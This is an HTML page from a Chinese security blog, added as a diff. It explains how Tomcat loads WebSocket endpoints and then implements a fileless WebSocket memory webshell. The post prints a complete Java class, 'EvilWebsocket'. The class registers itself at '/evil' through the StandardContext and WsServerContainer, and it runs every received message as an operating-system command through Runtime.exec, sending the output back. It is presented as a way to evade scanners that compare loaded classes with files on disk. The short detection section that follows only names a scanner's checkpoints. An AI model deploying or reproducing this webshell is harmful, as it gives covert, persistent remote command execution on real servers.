@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。从2013年有了JSR356标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java WebSocket规范（JSR356 ）. WebSocket内存马与传统的tomcat内存马不同，传统的内存马的查杀方式是通过查找内存当中的加载类与磁盘当中的落地文件做对比来进行查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebSocket内存马">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。从2013年有了JSR356标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java WebSocket规范（JSR356 ）. WebSocket内存马与传统的tomcat内存马不同，传统的内存马的查杀方式是通过查找内存当中的加载类与磁盘当中的落地文件做对比来进行查">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/2.png">
+<meta property="article:published_time" content="2024-08-01T06:45:30.000Z">
+<meta property="article:modified_time" content="2024-08-01T06:58:41.198Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2024/08/01/WebSocket内存马/","title":"WebSocket内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>WebSocket内存马 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#websocket%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-number">1.</span> <span class="nav-text">WebSocket内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0endpoint%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-number">1.1.</span> <span class="nav-text">服务端实现Endpoint的方式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B3%A8%E8%A7%A3%E6%96%B9%E5%BC%8Fserverendpoint"><span class="nav-number">1.1.1.</span> <span class="nav-text">注解方式：@ServerEndpoint</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF%E6%8A%BD%E8%B1%A1%E7%B1%BBendpoint"><span class="nav-number">1.1.2.</span> <span class="nav-text">继承抽象类：Endpoint</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#tomcat-websocket%E7%9A%84%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.2.</span> <span class="nav-text">Tomcat WebSocket的加载</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">Tomcat WebSocket内存马的实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#websocket%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="nav-number">3.</span> <span class="nav-text">Websocket内存马查杀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description">A big noob</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="A big noob">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="WebSocket内存马 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WebSocket内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-01 14:45:30 / 修改时间：14:58:41" itemprop="dateCreated datePublished" datetime="2024-08-01T14:45:30+08:00">2024-08-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。从2013年有了<code>JSR356</code>标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java
+WebSocket规范（JSR356 ）.</p>
+<p>WebSocket内存马与传统的tomcat内存马不同，传统的内存马的查杀方式是通过查找内存当中的加载类与磁盘当中的落地文件做对比来进行查杀(Filter/listener)，可是对于WebSocket来讲其对应的Filter文件是落地文件，准确的来说其依托的是原运行环境当中已存在的WsFilter，这对内存马查杀带来了新的挑战。</p>
+<span id="more"></span>
+<h4 id="websocket内存马">WebSocket内存马</h4>
+<p>Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。</p>
+<p>从2013年有了<code>JSR356</code>标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java
+WebSocket规范（JSR356 ）</p>
+<p>根据JSR356规定，
+建立WebSocket连接的服务器端和客户端，两端对称，可以互相通信。把<strong>通信端点抽象成类</strong>，就是<code>Endpoint</code>，每一个Endpoint对象代表WebSocket链接的一端，服务器端的叫<code>ServerEndpoint</code>，客户端的叫<code>ClientEndpoint</code>。客户端向服务端发送WebSocket握手请求，建立连接后就创建一个<code>ServerEndpoint</code>对象。</p>
+<p>ServerEndpoint和ClientEndpoint，有相同的生命周期事件（OnOpen、OnClose、OnError、OnMessage），不同之处是ServerEndpoint作为服务器端点，可以指定一个URI路径供客户端连接，ClientEndpoint则没有。</p>
+<p>Endpoint对象的生命周期方法如下：</p>
+<ul>
+<li>onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法，等同于注解@OnOpen。</li>
+<li>onClose：当会话关闭时调用。等同于注解@OnClose。</li>
+<li>onError：当链接过程中异常时调用。等同于注解@OnError。</li>
+<li>onMessage：接收到消息时触发。等同于注解@OnMessage</li>
+</ul>
+<h5 id="服务端实现endpoint的方式">服务端实现Endpoint的方式</h5>
+<p>服务器端的<code>Endpoint</code>有两种实现方式，一种是注解方式<code>@ServerEndpoint</code>，一种是继承抽象类<code>Endpoint</code>。</p>
+<h6 id="注解方式serverendpoint">注解方式：<span class="citation" data-cites="ServerEndpoint">@ServerEndpoint</span></h6>
+<p>一个@ServerEndpoint注解应该有以下元素：</p>
+<ul>
+<li><code>value</code>：必要，String类型，此Endpoint部署的URI路径。</li>
+<li><code>configurator</code>：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。</li>
+<li><code>decoders</code>：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。</li>
+<li><code>encoders</code>：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。</li>
+<li><code>subprotocols</code>：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。</li>
+</ul>
+<p>比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ServerEndpoint(value = &quot;/ws/&#123;userId&#125;&quot;, encoders = &#123;MessageEncoder.class&#125;, decoders = &#123;MessageDecoder.class&#125;, configurator = MyServerConfigurator.class)</span></span><br></pre></td></tr></table></figure>
+<p><span class="citation" data-cites="ServerEndpoint可以注解到任何类上">@ServerEndpoint可以注解到任何类上</span>，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@OnOpen</span> 建立连接时触发。</span><br><span class="line"><span class="meta">@OnClose</span> 关闭连接时触发。</span><br><span class="line"><span class="meta">@OnError</span> 发生异常时触发。</span><br><span class="line"><span class="meta">@OnMessage</span> 接收到消息时触发。</span><br></pre></td></tr></table></figure>
+<h6 id="继承抽象类endpoint">继承抽象类：Endpoint</h6>
+<p>继承抽象类<code>Endpoint</code>，重写几个生命周期方法，实现两个接口，比加注解
+<code>@ServerEndpoint</code>方式更麻烦。</p>
+<p>其中重写<code>onMessage</code>需要实现接口<code>jakarta.websocket.MessageHandler</code>，给Endpoint分配URI路径需要实现接口<code>jakarta.websocket.server.ServerApplicationConfig</code>。</p>
+<p>而<code>URI path</code>、<code>encoders</code>、<code>decoders</code>、<code>configurator</code>等配置信息由<code>jakarta.websocket.server.ServerEndpointConfig</code>管理，默认实现<code>jakarta.websocket.server.DefaultServerEndpointConfig</code>。</p>
+<p>通过编程方式实现Endpoint，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerEndpointConfig serverEndpointConfig = ServerEndpointConfig.Builder.create(WebSocketServerEndpoint3.class, &quot;/ws/&#123;userId&#125;&quot;).decoders(decoderList).encoders(encoderList).configurator(new MyServerConfigurator()).build();</span><br></pre></td></tr></table></figure>
+<h5 id="tomcat-websocket的加载">Tomcat WebSocket的加载</h5>
+<p>Tomcat提供了一个<code>javax.servlet.ServletContainerInitializer</code>的实现类<code>org.apache.tomcat.websocket.server.WsSci</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架</span><br></pre></td></tr></table></figure>
+<p>因此<strong>Tomcat的WebSocket加载是通过SCI机制完成的</strong></p>
+<p>WsSci可以处理的类型有三种：</p>
+<ul>
+<li>添加了注解@ServerEndpoint的类</li>
+<li>Endpoint的子类</li>
+<li>ServerApplicationConfig的实现类</li>
+</ul>
+<p>Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过
+WsSci 的onStartup方法初始化 Listener 和
+servlet，再扫描classpath下带有注解@ServerEndpoint的类和Endpoint子类。</p>
+<p>如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。</p>
+<p>然后startInternal方法里为ServletContext添加一个过滤器<code>org.apache.tomcat.websocket.server.WsFilter</code>，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用<a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-memshell-scanner">java-memshell-scanner</a>看到WsFilter）。</p>
+<h4 id="tomcat-websocket内存马的实现">Tomcat WebSocket内存马的实现</h4>
+<p>可以先看一下之前经典的内存马的实现方式比如filter。</p>
+<p>1.首先获取StandardContext（其他服务器也可以获取别的Context）</p>
+<p>2.然后初始化一个恶意的filter</p>
+<p>3.创建一个filterdef对象将filter放在里面，并将filterdef添加到context当中。</p>
+<p>4.然后使用context对象和filterdef对象创建filterconfig对象，并将filterconfig加入到filterconfigs（filterconfigs来源于context）当中</p>
+<p>5.最后使用filtermap写入filter和uri的对应关系，并加入context当中</p>
+<p>对于WebSocket内存马来讲，上一节提到了WsSci 的onStartup扫描
+classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：</p>
+<p>1.我们首先还是要先拿到StandardContext</p>
+<p>2.从StandardContext里面拿到WsServerContainer</p>
+<p>3.定义一个恶意类，并创建一个ServerEndpointConfig，给这个恶意类分配URI
+path</p>
+<p>4.调用ServerContainer.addEndpoint方法，将创建的ServerEndpointConfig添加进去</p>
+<p>我i们将上面的代码逻辑写入静态代码段</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(EvilWebsocket.class, <span class="string">&quot;/evil&quot;</span>).build();</span><br><span class="line">        <span class="type">WsServerContainer</span> <span class="variable">wsServerContainer</span> <span class="operator">=</span> (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            wsServerContainer.addEndpoint(serverEndpointConfig);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>由于该恶意类需要继承Endpoint所以它必须实现名为onOpen的方法，参考网上的实现方式，代码如下：（由于该函数只在建立连接的时候执行一次，所以其本身并没有什么值得利用的价值）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.session = session;</span><br><span class="line">    <span class="built_in">this</span>.session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在上面我们实现onOpen的时候，我们使用到了<code>this.session.addMessageHandler</code>这一方法，这导致其中的this不得不是一个MessageHandler对象，所以该类还需要同步实现MessageHandler接口。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt;</span><br></pre></td></tr></table></figure>
+<p>在实现了MessageHandler的接口之后，我们需要实现它的onMessage方法，这个方法在之前的介绍过程中我们得知，他会在双方进行通信的时候被调用。所以这个方法是最适合用于做命令执行的部分。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    Process exec;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        exec = Runtime.getRuntime().exec(s);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> exec.getInputStream();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="keyword">while</span>((i = inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">            stringBuilder.append((<span class="type">char</span>)i);</span><br><span class="line">        &#125;</span><br><span class="line">        inputStream.close();</span><br><span class="line">        exec.waitFor();</span><br><span class="line">        <span class="built_in">this</span>.session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终的websocket内存马实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt;&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="type">ServerEndpointConfig</span> <span class="variable">serverEndpointConfig</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(EvilWebsocket.class, <span class="string">&quot;/evil&quot;</span>).build();</span><br><span class="line">        <span class="type">WsServerContainer</span> <span class="variable">wsServerContainer</span> <span class="operator">=</span> (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            wsServerContainer.addEndpoint(serverEndpointConfig);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        <span class="built_in">this</span>.session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Process exec;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            exec = Runtime.getRuntime().exec(s);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> exec.getInputStream();</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">int</span> i;</span><br><span class="line">            <span class="keyword">while</span>((i = inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                stringBuilder.append((<span class="type">char</span>)i);</span><br><span class="line">            &#125;</span><br><span class="line">            inputStream.close();</span><br><span class="line">            exec.waitFor();</span><br><span class="line">            <span class="built_in">this</span>.session.getBasicRemote().sendText(stringBuilder.toString());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终效果</p>
+<img data-src="/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" class>
+<h4 id="websocket内存马查杀">Websocket内存马查杀</h4>
+<p>以tomcat-memshell-scanner这个内存马查杀工具举例，针对于filter内存马而言，他的观测点有如下几样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Filter的类名，Filter的Classloader，Filter对象的落地文件</span><br></pre></td></tr></table></figure>
+<img data-src="/2024/08/01/WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class>
